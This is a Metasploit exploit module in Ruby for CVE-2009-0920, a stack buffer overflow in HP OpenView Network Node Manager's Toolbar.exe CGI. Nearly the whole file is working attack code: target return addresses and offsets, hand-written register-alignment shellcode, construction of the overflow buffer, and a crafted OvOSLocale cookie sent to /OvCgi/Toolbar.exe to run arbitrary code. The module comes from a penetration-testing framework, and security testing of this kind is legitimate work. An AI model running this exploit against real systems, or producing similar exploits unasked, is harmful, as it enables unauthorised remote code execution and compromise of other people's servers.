##
# $Id: hp_nnm_toolbar_02.rb 13194 2011-07-16 05:21:20Z sinn3r $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'HP OpenView Network Node Manager Toolbar.exe CGI Cookie Handling Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.0
				and 7.53.  By sending a CGI request with a specially OvOSLocale cookie to Toolbar.exe, an
				attacker may be able to execute arbitrary code.  Please note that this module only works
				against a specific build (ie. NNM 7.53_01195)
			},
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 13194 $',
			'Author'         =>
				[
					'Oren Isacson', # original discovery
					'juan vazquez', # metasploit module (7.0 target)
					'sinn3r',       # 7.53_01195 target
				],
			'References'     =>
				[
					[ 'CVE', '2009-0920' ],
					[ 'OSVDB', '53242' ],
					[ 'BID', '34294' ],
					[ 'URL', 'http://www.coresecurity.com/content/openview-buffer-overflows']
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'          => 4000,
					'BadChars'       => "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x7f\x3b\x2b",
					'DisableNops'    => true, # no need
					'EncoderType'    => Msf::Encoder::Type::AlphanumMixed,
					'EncoderOptions' =>
					{
						'BufferRegister' => 'EDX'
					}
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[
						#Windows XP SP3
						'HP OpenView Network Node Manager Release B.07.00',
						{
							'Ret' => 0x5A212147, # ovsnmp.dll call esp
							'Offset' => 0xFC,  # until EIP
							# Pointer to string with length < 0x100
							# Avoid crash before vulnerable function returns
							# And should work as a "NOP" since it will prepend shellcode
							#'ReadAddress' => 0x5A03A225,# ov.dll
							'ReadAddress' => 0x5A03A225,# ov.dll
							'EDXAdjust' => 0x17,
							# 0x8 => offset until "0x90" nops
							# 0x4 => "0x90" nops
							# 0x2 => len(push esp, pop edx)
							# 0x3 => len(sub)
							# 0x6 => len(add)
						}
					],
					[
						#Windows Server 2003
						'HP OpenView Network Node Manager 7.53 Patch 01195',
						{
							'Eax'       => 0x5a456eac,   #Readable address for CMP BYTE PTR DS:[EAX],0
							'EaxOffset' => 251,          #Offset to overwrite EAX
							'Ret'       => 0x5A23377C,   #CALL EDI
							'Max'       => 8000,         #Max buffer size
						}
					]
				],
			'DisclosureDate' => 'Jan 21 2009'))

		register_options( [ Opt::RPORT(80) ], self.class )
	end

	def exploit

		if target.name =~ /7\.53/

			#EDX alignment for alphanumeric shellcode
			#payload is in EDI first.  We exchange it with EDX, align EDX, and then
			#jump to it.
			align  = "\x87\xfa"      #xchg edi,edx
			align << "\x80\xc2\x27"  #add dl,0x27
			align << "\xff\xe2"      #jmp edx

			#Add the alignment code to payload
			p = align + payload.encoded

			sploit  = 'en_US'
			sploit << rand_text_alphanumeric(247)
			sploit << [target.ret].pack('V*')
			sploit << rand_text_alphanumeric(target['EaxOffset']-sploit.length+'en_US'.length)
			sploit << [target['Eax']].pack('V*')
			sploit << rand_text_alphanumeric(3200)
			sploit << make_nops(100 - align.length)
			sploit << align
			sploit << p
			sploit << rand_text_alphanumeric(target['Max']-sploit.length)

		elsif target.name =~ /B\.07\.00/

			edx = Rex::Arch::X86::EDX

			sploit = "en_US"
			sploit << rand_text_alphanumeric(target['Offset'] - "en_US".length, payload_badchars)
			sploit << [target.ret].pack('V')
			sploit << [target['ReadAddress']].pack('V')
			sploit << "\x90\x90\x90\x90"
			# Get in EDX a pointer to the shellcode start
			sploit << "\x54" # push esp
			sploit << "\x5A" # pop edx
			sploit << Rex::Arch::X86.sub(-(target['EDXAdjust']), edx, payload_badchars, false, true)
			sploit << "\x81\xc4\x48\xf4\xff\xff" # add esp, -3000
			sploit << payload.encoded

		end

		#Send the malicious request to /OvCgi/ToolBar.exe
		#If the buffer contains a badchar, NNM 7.53 will return a "400 Bad Request".
		#If the exploit causes ToolBar.exe to crash, NNM returns "error in CGI Application"
		send_request_raw({
			'uri'     => "/OvCgi/Toolbar.exe",
			'method'  => "GET",
			'cookie'  => "OvOSLocale=" + sploit + "; OvAcceptLang=en-usa",
		}, 20)

		handler
		disconnect
	end

end


=begin
NNM B.07.00's badchar set:
00 0D 0A 20 3B 3D 2C 2B

NNM 7.53_01195's badchar set:
01 02 03 04 05 06 07 08 0a 0b 0c 0d 0e 0f 10 11    ................
12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f 7f       ...............
3b = delimiter
2b = gets converted to 0x2b
=end